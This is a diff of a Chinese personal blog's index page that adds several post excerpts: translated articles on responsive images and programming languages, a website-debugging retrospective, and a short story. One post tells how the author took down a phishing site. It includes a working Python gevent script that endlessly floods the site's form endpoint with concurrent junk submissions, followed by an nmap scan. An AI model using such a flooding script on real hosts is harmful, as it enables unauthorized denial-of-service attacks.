@@ -59,53 +59,57 @@
     
       
       	
-      	<li><a href="/archieve.html">归档</a></li>
-      	
-      
-    
-  
-    
-      
-    
-  
-    
-      
-      	
-      	<li><a href="/categories.html">分类</a></li>
-      	
-      
-    
-  
-    
-  
-    
-      
-      	
-      	<li><a href="/pages.html">页面</a></li>
-      	
-      
-    
-  
-    
-      
-    
-  
-    
-      
-    
-  
-    
-      
-      	
-      	<li><a href="/tags.html">标签</a></li>
-      	
-      
-    
-  
-    
-      
-      	
       	<li><a href="/about/">联系我</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/archieves/">归档</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/categories/">分类</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+      	
+      	<li><a href="/pages/">页面</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/tags/">标签</a></li>
       	
       
     
@@ -155,10 +159,10 @@
 
 <div class="row">
   <div class="col-xs-12 post-content">
-    
+     
 <link rel="stylesheet" type="text/css" href="/assets/themes//bootstrap-3/css/index.css?body=1">
-<div class="posts">
-  
+<div class="posts"> 
+    
     <article class="post-content">
         <header class="text-center">
             <h1 class="post-title">
@@ -171,12 +175,30 @@
 <p>原文链接：<a href="http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/">戳这里</a></p>
 </blockquote>
 
+<p><img src="http://netdna.webdesignerdepot.com/uploads/2015/08/featured_images1.jpg" alt=""></p>
+
+<p>Web 是一种可视化的媒体。绚丽的视觉效果，很大程度上离不开图片文件所作出的贡献。虽然（Whilst）其中的许多效果都可以用 CSS 和 内联 SVG 来实现，互联网上的许多站点仍需要图片文件。</p>
+
+<p>从去年的统计来看，每个站点中，图片平均占了一半的页面体积，并且随着时间的推移，图片体积有持续增加的趋势；就 2014 年而言，图片的大小便增长了 <strong>21%</strong>。</p>
+
+<p>与此同时，互联网终端的种类、数量也在增长。从 72 ppi（市场份额正在下降）到 600 ppi，不同设备的分辨率（resolution）有着天壤之别。</p>
+
+<p>创建能在任何设备中都有着高质量的图片，其实再容易不过了——用 1000 ppi 的质量保存图片，然后就可以不用再理他了（译者注：原文是 call it a day）。生成的图片，即使是在分辨率最高的设备上查看也是十分清晰的（crisp）。但是，在图片质量提升的同时，图片文件的大小也会相应地增加。要知道，<strong>页面加载时间</strong>可是影响用户体验的<strong>首要因素</strong>——因此，保证站点能够及时地呈现在用户面前是我们义不容辞（incrumbent）的责任。高质量的图片，即使是在宽带环境下加载也要耗费几十秒，更不用说（let alone）是移动端的设备了——简直就是无法使用。</p>
+
+<p>响应式图片的目的，不是要为设备提供尽可能高质量的图片（这一点，我们很容易做到），而是要为设备提供它所能支持的最高质量的图片，仅此而已（nothing more）。</p>
+
+<p>从这篇指南中，你将了解到响应式图片的工作原理（what works），响应式图片仍然存在的问题和陷阱（pitfall），以及如何将响应式图片运用到网站中。</p>
+
+
+            <a href="/the-state-of-responsive-images-in-2015/" style="display: block; text-align: center; padding: 25px 0;">阅读全文...</a>
         </section>
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-open"></i></li>
-            
-            
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-open"></i>
+                </li>
+                
+                
 
 
   
@@ -196,12 +218,12 @@
   
 
 
-          </ul>
+            </ul>
           
 
          
     </article>
-  
+    
     <article class="post-content">
         <header class="text-center">
             <h1 class="post-title">
@@ -214,12 +236,62 @@
 <p>原文链接：<a href="http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/">戳这里</a></p>
 </blockquote>
 
+<p>在过去的一周中，几位同事曾两次问了我这个问题。听起来，这像是一个糟糕的问题，但事实上并不是这样的。</p>
+
+<p>最简短的答案就是：<strong>尽管我们并不需要这么多语言，但我们还是想要（want）它们</strong>。让我们再探索得更深一些吧。</p>
+
+<h2>难道它们不都是一样的吗？</h2>
+
+<p>某种意义上（In a sense），是的。创建一个网站，你可以使用 <code>Ruby</code>、<code>Java</code>、<code>Python</code>、<code>C#</code>、<code>Go</code> 抑或是 <code>Javascript</code>。甚至，你可以使用 <code>C</code> 或 <code>C++</code> 或 <code>Haskell</code> 或 <code>Rust</code> 或 <code>COBOL</code> 或 <code>Pascal</code> 或 <code>Perl</code>。</p>
+
+<p>事实的背后就是：这些语言都有着同样的目的——把人类的思想转变成为计算机能够读懂的 1 和 0——用夸张的（highfalutin）的计算机术语来讲：它们都是 <a href="https://en.wikipedia.org/wiki/Turing_completeness">图灵完备（Turing complete）</a> 的。</p>
+
+<p>从底层上来看，这些语言都<strong>是</strong>完全一样的。但从表面（人类和它们交互的接口）上来看，它们却有很大的不同。这，便是人们关注的焦点了。</p>
+
+<h2>不同的任务需要不同的工具</h2>
+
+<p>事实上，编程语言只是工具，而对于不同的任务，我们需要选择不同的工具。拖拉机（tractor trailer）、自行车、特斯拉汽车（Tesla）都是交通工具——它们都有轮子，有转向器（steering ?），并且都会将你从一个地方带到另一个地方——但显然，我们要将它们运用到不同的场景中。</p>
+
+<p>编程语言也是类似的：若是要构建网站，<code>Ruby</code> 和 <code>Javascript</code> 是不错的选择；<code>Java</code> 和 <code>C++</code> 则常常被运用在金融领域；至于 <code>Python</code> 和 <code>R</code>，它们是统计分析的工具。</p>
+
+<p>在语言的选择上，我们常常要从便捷程度、安全性和速度这几个方面进行权衡（trade-offs）——就像交通工具一样。通常来讲，需要根据手头上的工作视情况而定。</p>
+
+<h2>开发者们有不同的“口味”（tastes）</h2>
+
+<p>抛开纯粹的功能，开发者还会根据个人的“口味”来选择工具。</p>
+
+<p>编程语言是人类向计算机<strong>表达</strong>想法的工具。尽管不同的开发者在许多方面都有相似之处，我们的思考方式仍存在着区别——这是自然所决定的。</p>
+
+<p>由于有多种编程语言供我们选择，我们完全可以选择一种“以我们想要的方式工作”的语言。有的开发者喜欢<code>Ruby</code>的灵活性（flexibility），而另一些则喜欢<code>Java</code>的严谨（strictness）。同时，有些语言看上去和数学一样深奥，而另一些读起来却和散文一样（prose）。</p>
+
+<h2>以人为本</h2>
+
+<p>业务是以人为本的。</p>
+
+<p>撇开功能和个人“口味”，通常来说，你会选择一种你了解的，或是你周围的人了解的语言。</p>
+
+<p>Stack Overflow 选择了 <code>C#</code>，很大程度上是因为团队的创始人了解它。其次（In turn），它也是为创始人的朋友和同事所了解的。<code>C#</code> 使招聘工作（recruiting）变得更加简单，同时也使 Stack Overflow 更快地进入市场。</p>
+
+<p>（幸运的是，<code>C#</code> 同时也有着超棒的技术亮点）</p>
+
+<p>一种技术需要一个“生态圈”（ecosystem）来支持——那便是能为每个有需要的开发者提供工具和帮助的社区（communities）和组织（organizations）。好的“生态圈”能让个人开发者更加成功——<code>Ruby</code> 就是个很好的例子。</p>
+
+<h2>多样性就是力量</h2>
+
+<p>总的来说，由于我们有着各种各样的任务，同时也有着各种各样的人在完成这些任务，我们才有了各种各样的编程语言。</p>
+
+<p>而正是这种多样性的存在，使得许多有趣的程序，有趣的公司甚至是有趣的职业生涯，从不可能成为了可能。</p>
+
+
+            <a href="/why-are-so-many-programming-languages/" style="display: block; text-align: center; padding: 25px 0;">阅读全文...</a>
         </section>
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-open"></i></li>
-            
-            
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-open"></i>
+                </li>
+                
+                
 
 
   
@@ -235,12 +307,12 @@
   
 
 
-          </ul>
+            </ul>
           
 
          
     </article>
-  
+    
     <article class="post-content">
         <header class="text-center">
             <h1 class="post-title">
@@ -251,12 +323,63 @@
         <section class="content">
             <p>真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p>
 
+<p>事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管 wisecity 已经举办了两届，尽管在此之前我已做过 4 个网站，尽管这次的网站是在上一届的基础上进行改造的，我的心里仍有些忐忑不安，害怕它会出什么问题——抑或是大会的工作人员操作不当导致网站崩溃云云（这事真的发生了）。5 天的 wisecity 大会，我都身在北京，身边没有电脑，没有解决问题的条件，因此需要一个有基本的编程能力的人协助我。5 天下来，问题还不少，调试的过程可谓是十分原始：接到问题后，囿于有限的条件，我只能通过翻看手机上的代码，在脑海中模拟并觉出问题所在，找到最小代价的改动方案，再将改动之处通过短信通知 cc——当然，很多时候并不那么顺利，我还需要跟多的信息帮助判断，比如错误日志，又比如进行特定操作时的表现（这个最坑爹，可遇而不可求）。我尽一切努力在脑海中想象着程序的流程，很累，但也很有挑战性。</p>
+
+<p>第一天就遇到了一个棘手的问题：高伯在删除测试数据时不小心把管理员账号（admin）一起删掉了。这个消息从扬声器传出后，我足足沉默了一分钟，
+心里像是有千万头草泥马奔过：</p>
+
+<blockquote>
+<p>怎么这么毛手毛脚？这下可好了，麻烦大了——虽然这个设计是有些不合理，但这不能怪我，django 已经封装好了（姜戈：怪我咯？）。快想办法快想办法……直接去后台加一个？不行不行，密码这块很难弄，MD5 + SHA1 + Salt，根本不是人能算的——只能让 django 自己产生一个用户了。嗯，我需要一个 MySQL，一个完整的 Python 开发环境，各种包……不知 cc 能不能应付过来。真是的一大早!@#$%^……
+<img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""> </p>
+</blockquote>
+
+<p>挂断电话，抄起手机噼里啪啦给 cc 发了一条短信，手把手教配置 MySQL，django，导出 SQL，上传数据库……吧啦吧啦洋洋洒洒几百字。发送时一直祈祷：但愿 cc 悟性高一些，不然真的完了——还好，半个小时后，前线传来了好消息：一切顺利。</p>
+
+<p>总算是松了一口气，才发现，背已汗湿。</p>
+
+<p>然而，事情还没有结束。</p>
+
+<p>第二天一早，我又被告知：上传的文件下载不了（纳尼？走之前不是才作过测试吗）。点开文件看网址，发现原来是七牛的域名后面少了一个<code>/</code>，很快便处理好了。本以为可以好好玩一天了（那天出去玩），逛了大半个北京，夕阳西下时，却又接到一个 bug：选手列表只显示了 10 个用户，但应该有 40+ 个。</p>
+
+<p>这个 bug，前后调了 2 个小时。从奥林匹克公园，到中关村——因为，我并不知道问题出在哪，一点也不知道。打 <code>console.log</code>，翻看网络记录（没错！在短信这种高时滞的通讯条件下！），最终发现，原来是 REST 返回的用户列表顺序反了，加载了最后 10 个，但由于用户没有明显的顺序标志，所以调试时没有察觉。改正之后，终于可以安心吃完饭——</p>
+
+<p>谁知，两分钟后，短信又开始轰炸了：加载的用户列表有重复项！很多的重复项！！没有规律的重复项！！！</p>
+
+<p>这个 bug，前后又调了 2 个小时。从中关村，再到人大附中，直到繁星爬满了苍穹。第一个反应是自制的瀑布流控件滚动事件并发处理没有做好。翻看源代码，似乎找到一处疑似有问题的地方，尝试让 cc 改了一下——半个小时后，传回了一个令人泄气的消息（中间配置<code>grunt</code>又耗费了好些功夫）。冥想了一个小时，前后端的代码都看遍了，就是没有发现问题，最终只得放弃，告诉高伯用一些奇技*巧避开重复项。直至回来后，静下心分析代码，才发现在一个不起眼的地方有一处笔误，这是重构 HFMUN 的瀑布流控件时产生的。</p>
+
+<p>之后的几天，又有几个大大小小的 bug，抑或是需求改动，处理得还算顺利。可怕的是最后一天，KVDB 直接宕掉了——我整个缓存都是挂在 KVDB 上的，也怪当时没有作容灾处理，这个事件直接导致全站报 500 错误。急急忙忙关掉了缓存（还好做缓存时解了耦，只需改动两处即可），然后再质问 SAE，这些都是后话了。</p>
+
+<p>然而，这里有个值得反思的问题：既然我已经作过 4 个网站，为何还是会有 bug 出现？从 HFMUN 1.0，到 wisecity 1.0，到 HFMUN 2.0，随着我技术的逐渐成熟，bug 出现的频率也在不断下降——但是 bug 仍在，就像“杀不死的小强”一样。</p>
+
+<p>测试，关键还是在测试。</p>
+
+<p>人的主观意识，受制于时空、环境等诸多因素，任何一个参数的改变都有可能影响主观能动性的发挥。因此，不能保证在任何时候人的意识都能正确地、高效地发挥作用。软件工程，作为人类纯意识的产物，其正确性并不能百分百地保证。或是精神不振引起的一处笔误，或是重构迁移时没有同步更改的一处配置，抑或是一处自己在开发过程中完全没有意识到的错误——设计归设计，程序是否能运行，还是电脑说了算。许多的 bug 就是这样产生的。</p>
+
+<p>这个时候，单元测试（Unit Test）就显得非常重要了。通过分析需求而设计的测试样例，可以保证功能的相对正确性，即在能够考虑到的所有情况下，程序都能狗正常运行。这是重构（Refactory）过程中十分重要的一个环节，因为外部不变性是重构必须遵守的一个准则。</p>
+
+<p>在软件工程的上古时代，测试常常是由人工来完成的。团队中，总有几名成员每天都在做着重复、机械的工作，即对新增的功能或是修改过的功能进行测试。这种测试机制费时费力，同时也不是非常有效——上面已经说过了，没有人能保证主观意识的正确性。后来，出现了基于脚本的批量测试，测试人员可以编写一小段代码对特定的功能进行校验，很大程度地提高了效率；再到今天的分布式测试，成熟的测试系统可以模拟多种不同的生产环境，检测到代码库的变化后，便会自动进行单元测试。这是单元测试的自动化进程。</p>
+
+<p>今天的自动化测试固然很成熟，基本可以检测到各种逻辑错误。但在测试领域，却仍有一处令其束手无策的“禁地”——这便是 GUI 测试。综合分析 wisecity2.0 的 bugs，其中大部分都是前端出了问题。GUI 测试的麻烦在于：</p>
+
+<ul>
+<li>GUI 是一个输入与输出交替进行的系统，并且输入具有无限的可能，无法用有限的测试样例对输入进行覆盖。比如第二天发生的那个 bug 需要在“文件上传成功后，跳转到首页，点击下载链接”、“用户数量超过 10 个，在列表页面快速滚动鼠标滚轮”才能被触发。许多的 bug 只有在真实生产环境中被用户捕捉到。</li>
+<li>GUI 的正确性没有一个绝对的判定标准。元素错位、颜色不正确，这些事件都不报错，但它们也是 bug，通常也只有人类认为它们是 bug。但它们的发生并不影响功能，只是用户体验（User Experience）不好——用户体验是一个纯主观的概念，至少在当下，计算机是不能理解的。</li>
+</ul>
+
+<p>目前，GUI 测试主要还是依赖人工。Facebook 就有一个庞大的测试人员系统，以模拟尽可能多的用户操作样例。诚然，业界已经开始出现一些 前端自动化测试框架，有如 selenium、phantomjs 等通过 mock 事件模拟用户操作，更有甚者如 PhantomCSS 可以对特定操作的结果进行像素比对，可软件的主观部分还是需要人脑来判断。</p>
+
+<p>这是一个好时代，周围的一切都在飞快地变化着。希望在不久的将来，当人工智能出现时，这个问题能够有效地解决。</p>
+
+
+            <a href="/wisecity-conclusion/" style="display: block; text-align: center; padding: 25px 0;">阅读全文...</a>
         </section>
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-open"></i></li>
-            
-            
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-open"></i>
+                </li>
+                
+                
 
 
   
@@ -280,12 +403,14 @@
   
 
 
-          </ul>
+            </ul>
           
 
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-tags"></i></li>
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-tags"></i>
+                </li>
             
             
 
@@ -300,10 +425,10 @@
 
 
 
-          </ul>
+            </ul>
          
     </article>
-  
+    
     <article class="post-content">
         <header class="text-center">
             <h1 class="post-title">
@@ -314,12 +439,75 @@
         <section class="content">
             <p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
 
+<blockquote>
+<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com">wap.abchyd.com</a> 进行领取！【农业银行】</p>
+</blockquote>
+
+<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>
+
+<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>
+
+<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>
+
+<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>
+
+<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>
+
+<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>
+
+<p>简单地谢了一个脚本：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#! /usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">gevent.monkey</span>
+<span class="n">gevent</span><span class="o">.</span><span class="n">monkey</span><span class="o">.</span><span class="n">patch_all</span><span class="p">()</span>
+<span class="kn">import</span> <span class="nn">gevent</span>
+<span class="kn">import</span> <span class="nn">urllib2</span><span class="o">,</span> <span class="nn">urllib</span>
+<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid1</span>
+
+<span class="k">def</span> <span class="nf">fuck</span><span class="p">():</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid1</span><span class="p">())[:</span><span class="mi">16</span><span class="p">]</span>
+    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">&#39;http://www.abchyd.com/add_1.asp&#39;</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
+            <span class="s">&#39;logonCardNum&#39;</span><span class="p">:</span> <span class="nb">id</span><span class="p">,</span>
+            <span class="s">&#39;netType&#39;</span><span class="p">:</span> <span class="s">&#39;111111&#39;</span><span class="p">,</span>
+            <span class="s">&#39;tel&#39;</span><span class="p">:</span> <span class="s">&#39;12345678900&#39;</span><span class="p">,</span>
+            <span class="s">&#39;randomId&#39;</span><span class="p">:</span> <span class="s">&#39;1234&#39;</span>
+        <span class="p">}))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="s">&#39;ok&#39;</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">gevent</span><span class="o">.</span><span class="n">joinall</span><span class="p">([</span><span class="n">gevent</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="n">fuck</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">)])</span>
+</code></pre></div>
+<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>
+
+<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>
+
+<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>
+
+<p>两个小时后。</p>
+
+<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>
+
+<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>
+
+<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>
+
+<p>真正的网络攻防战，远不止如此。</p>
+
+
+            <a href="/how-to-fuck-a-bilk-site/" style="display: block; text-align: center; padding: 25px 0;">阅读全文...</a>
         </section>
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-open"></i></li>
-            
-            
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-open"></i>
+                </li>
+                
+                
 
 
   
@@ -335,12 +523,12 @@
   
 
 
-          </ul>
+            </ul>
           
 
          
     </article>
-  
+    
     <article class="post-content">
         <header class="text-center">
             <h1 class="post-title">
@@ -351,12 +539,80 @@
         <section class="content">
             <p>又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p>
 
+<p>他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p>
+
+<p>他知道，这一切，只是为了那个诺言。</p>
+
+<p>他清楚地记得，在早些时候，他和她许下了一个诺言：这三年，我们就把对方当成空气吧，谁也不认识谁。</p>
+
+<p>很奇怪的约定，不是吗？既然是同班同学，抬头不见低头见，又何出此言。</p>
+
+<p>想到这，他竟有些羞愧起来。</p>
+
+<p>而事实上，在更早些的时候，他们的关系并不是这样的——甚至，还是较要好的朋友。在那个遥远的年代，当女孩还未成为少女，他们还曾一起外出学习，一起嬉闹。他俩的相识源于各自父母的同学关系——他很高兴，她也很高兴，自己有这么一个朋友。</p>
+
+<p>是的，只是朋友，不是别的什么——一个令人向往的时候。</p>
+
+<p>上了初中，尽管进了不同的班级，他还是偶尔会去找她。一切依旧。</p>
+
+<p>但不知为何，一些奇怪的话却在班上渐渐漫开，如同疯长的野草。每一次去找她，他都感觉背后有人在窃窃私语，甚至还有几双异样的目光。诚然，在这个情窦初开的年纪，这样的一种关系是很敏感的。</p>
+
+<p>起初，他很反感这些言论。每一次，他都会极力辩解，甚至和对方吵得面红耳赤。可换来的，却是各种鬼脸，以及更加刻薄的话，就像火上浇油一般。</p>
+
+<p>渐渐地，他学会了沉默。为了避开那些讨厌的话，也不再那么频繁地去找她了。</p>
+
+<p>但，不知为什么，这之后每次想起她，心里却多了一些异样的感觉——这在以前是没有的，一种莫名的、不由自主的激动，一种朦胧的依恋——</p>
+
+<p>就像那流言蜚语所说的，他喜欢上她了。</p>
+
+<p>人，真是奇怪的动物。</p>
+
+<p>他不再对那些传言感到愤怒，甚至，还附和起来，公开表露自己的心声——这时，他清楚：这已不再是传言，而是自己真实的想法。</p>
+
+<p>然而，她却在悄悄地发生变化——不知为何，他每次去找她，她却借故不出来。在路上相遇，也不打招呼，没有微笑，宛如陌生人一般。</p>
+
+<p>他很奇怪，却也没多想，大概是有了新朋友罢——人都会长大的。</p>
+
+<p>直到，那个落雨的夏夜。</p>
+
+<p>那天，正是中考放榜的日子，他得知她和自己考入了同一所重点高中，并进入了同一个重点班，很是兴奋。刚想通过QQ为她庆贺，不料却发觉：自己已被她拉黑了。</p>
+
+<p>想起初中三年的种种变化，他再也忍不住了，立即发短信询问她。得到的，却是她冰冷的回复：</p>
+
+<p>“之前我一直把你当朋友，可你却把我们想成某种关系，还到处宣扬。这让我很受伤。我想，我们还是不要做朋友了……”</p>
+
+<p>“接下来的三年，我真的不知道该如何度过，和你同在一个班，我真的很痛苦。就把我当成空气吧，这样对你我都好……”</p>
+
+<p>他沉默了，回想自己的种种，的确，有些太过分了。但他却不知，这些事，会如此伤她的心。</p>
+
+<p>也好，就让我们彼此当陌生人吧。</p>
+
+<p>夕阳转了个角度，那一片金黄在一点点扩大，但同时也变得更加温柔。</p>
+
+<p>两年了，他们没有说过一句话。</p>
+
+<p>尽管流言蜚语早已不在，他也不愿再与她接触——一切，都是因为那个诺言。</p>
+
+<p>如果不能做朋友，那不伤害对方，也是一种善良。</p>
+
+<p>“之前你们关系不是很好的吗？怎么现在像不认识了一样？”两年来，常有好奇的人问他。</p>
+
+<p>每一次，他都会神秘地笑一笑：</p>
+
+<p>“这是一个不能说的秘密。”</p>
+
+<p>（致：那个被伤害过的她）</p>
+
+
+            <a href="/secret/" style="display: block; text-align: center; padding: 25px 0;">阅读全文...</a>
         </section>
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-open"></i></li>
-            
-            
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-open"></i>
+                </li>
+                
+                
 
 
   
@@ -368,12 +624,14 @@
   
 
 
-          </ul>
+            </ul>
           
 
         
-          <ul class="tag_box inline">
-            <li><i class="glyphicon glyphicon-tags"></i></li>
+            <ul class="tag_box inline">
+                <li>
+                    <i class="glyphicon glyphicon-tags"></i>
+                </li>
             
             
 
@@ -386,19 +644,19 @@
 
 
 
-          </ul>
+            </ul>
          
     </article>
-  
+    
 </div>
 
 <ul class="pager">
-  
+    
     <li class="previous">
-      <a class="prev" href="/page2/">&larr; 上一页</a>
+        <a class="prev" href="/page/2/">&larr; 上一页</a>
     </li>
-  
-  
+    
+    
 </ul>
 
   </div>
